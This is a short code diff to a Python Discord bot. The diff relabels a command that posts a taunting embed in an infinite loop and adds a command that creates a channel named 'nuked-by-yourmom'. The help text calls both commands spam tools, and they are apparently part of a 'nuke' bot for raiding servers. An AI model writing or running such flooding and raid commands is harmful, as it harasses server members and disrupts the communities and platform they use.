@@ -61,23 +61,19 @@ async def __ban__(ctx, member: discord.Member, *, reason=None):
 
 
 
-#Clear
+#Spam
 @client.command(name="spam", help="Spam's a amount of messages")
 async def spam(ctx):
     embed = discord.Embed(title="LLLLL", description=f"BEAMED BY YOUR MOM!!")
     while(True):
         await ctx.send(embed=embed)
-
+        
+        
+#CreateChannel
+@client.command(name="channel", help="Spam's a amount of channel's")
+async def spam(ctx):
+    await ctx.guild.create_text_channel("nuked-by-yourmom")
     
-    
-
-
-
-
-
-
-
-
 
 
 
